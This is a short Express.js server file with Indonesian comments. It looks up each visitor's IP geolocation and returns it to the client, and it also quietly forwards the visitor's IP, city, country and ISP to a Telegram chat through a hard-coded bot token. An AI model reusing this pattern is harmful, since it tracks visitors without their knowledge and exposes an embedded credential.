const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.get('/api/ip', async (req, res) => {
  const visitorIP = req.ip;

  try {
    const apiUrl = `http://ip-api.com/json/${visitorIP}`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    // Kirim hanya bagian yang diinginkan ke client
    const responseData = {
      ip: data.query,
      city: data.city,
      country: data.country,
      isp: data.isp,
    };

    // Kirim respon ke client
    res.header("Content-Type",'application/json');
    res.send(JSON.stringify(responseData, null, 2));

    // Kirim respon ke bot Telegram
    sendToTelegram(responseData);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

// Fungsi untuk mengirim respon ke bot Telegram
function sendToTelegram(data) {
  const botToken = '6644867511:AAEnBdF3Xod2w01kKn4DKx-2tUwepV0fHYE';
  const chatId = '5819951956';
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const message = `New IP Data:\n${JSON.stringify(data, null, 2)}`;
  fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message }),
  });
}
